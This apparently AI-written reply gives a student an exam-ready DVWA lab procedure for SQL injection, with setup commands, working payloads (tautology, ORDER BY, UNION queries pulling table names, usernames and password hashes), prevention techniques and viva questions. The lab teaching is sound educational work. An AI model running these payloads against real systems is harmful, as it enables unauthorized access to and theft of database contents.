@@ -1,0 +1,268 @@
+Good 👍 Janardhan.
+Here is your **simple, step-by-step, exam-ready procedure** for SQL Injection Lab.
+
+Source: 
+
+---
+
+# ✅ Experiment: SQL Injection Attack (DVWA)
+
+## 🎯 Aim:
+
+To understand how SQL Injection occurs and how attackers bypass authentication and extract database data.
+
+⚠️ Perform only on intentionally vulnerable apps like DVWA.
+
+---
+
+# 🔹 Requirements
+
+✔ Kali Linux
+✔ DVWA
+✔ Apache & MySQL
+✔ Firefox
+✔ Basic SQL knowledge
+
+---
+
+# 🔥 PART 1: Setup DVWA
+
+---
+
+## ✅ Step 1: Install DVWA
+
+Open Terminal:
+
+```bash
+sudo apt update
+sudo apt install dvwa -y
+```
+
+---
+
+## ✅ Step 2: Start Services
+
+```bash
+sudo service apache2 start
+sudo service mysql start
+```
+
+---
+
+## ✅ Step 3: Configure DVWA
+
+Open config file:
+
+```bash
+sudo nano /etc/dvwa/config.inc.php
+```
+
+Make sure:
+
+```php
+$_DVWA['db_password'] = '';
+```
+
+Save & Exit.
+
+---
+
+## ✅ Step 4: Open DVWA
+
+Open Firefox:
+
+```
+http://127.0.0.1/dvwa
+```
+
+Login:
+
+```
+Username: admin
+Password: password
+```
+
+Click **Create / Reset Database**
+
+---
+
+## ✅ Step 5: Set Security Level
+
+Go to:
+
+```
+DVWA Security
+```
+
+Set:
+
+```
+Security Level = Low
+```
+
+Click Submit.
+
+---
+
+# 🔥 PART 2: Perform SQL Injection
+
+---
+
+## ✅ Step 6: Open SQL Injection Module
+
+Go to:
+
+```
+DVWA → Vulnerabilities → SQL Injection
+```
+
+You will see **User ID input box**.
+
+---
+
+# 🔹 Basic SQL Injection
+
+---
+
+## ✅ Step 7: Normal Input
+
+Enter:
+
+```
+1
+```
+
+✔ Shows admin details normally.
+
+---
+
+## ✅ Step 8: Authentication Bypass
+
+Enter:
+
+```
+1' OR '1'='1
+```
+
+✔ Result: All user records displayed
+✔ Confirms SQL Injection vulnerability
+
+---
+
+# 🔹 Database Enumeration
+
+---
+
+## ✅ Step 9: Find Number of Columns
+
+Test:
+
+```
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+```
+
+When error appears →
+Last successful number = total columns
+
+---
+
+## ✅ Step 10: UNION-Based Injection
+
+```
+1' UNION SELECT 1,2-- -
+```
+
+If no error → UNION works.
+
+---
+
+## ✅ Step 11: Extract Database Name
+
+```
+1' UNION SELECT database(),2-- -
+```
+
+✔ Displays database name.
+
+---
+
+## ✅ Step 12: Extract Table Names
+
+```
+1' UNION SELECT table_name,2 
+FROM information_schema.tables 
+WHERE table_schema=database()-- -
+```
+
+✔ Shows all tables.
+
+---
+
+## ✅ Step 13: Extract Column Names
+
+```
+1' UNION SELECT column_name,2 
+FROM information_schema.columns 
+WHERE table_name='users'-- -
+```
+
+✔ Shows column names like:
+
+* user
+* password
+* user_id
+
+---
+
+## ✅ Step 14: Extract Username & Password
+
+```
+1' UNION SELECT user,password FROM users-- -
+```
+
+✔ Displays usernames
+✔ Passwords may appear as hashes
+
+---
+
+# ✅ Final Result (Write This)
+
+The SQL Injection attack was successfully performed, demonstrating:
+
+* Authentication bypass
+* Unauthorized data access
+* Improper input validation vulnerability
+
+---
+
+# 🔥 Conclusion (Write Exactly)
+
+This experiment proves that unsanitized user input leads to SQL Injection. Attackers can extract sensitive database information. Proper security controls are necessary to prevent such attacks.
+
+---
+
+# 🔐 Prevention Techniques (Very Important for Viva)
+
+✔ Prepared Statements (Parameterized Queries)
+✔ Input Validation
+✔ Stored Procedures
+✔ Web Application Firewall
+✔ Least Privilege Access
+
+---
+
+# 🎤 Viva Questions (Prepare These)
+
+1. What is SQL Injection?
+2. Why does `' OR '1'='1` work?
+3. What is UNION-based SQL Injection?
+4. What is information_schema?
+5. How to prevent SQL Injection?
+
+---
+
+If next experiment is XSS, IDS, VPN, Steganography, etc., send it.
+
+We’ll finish everything tonight 💪🔥
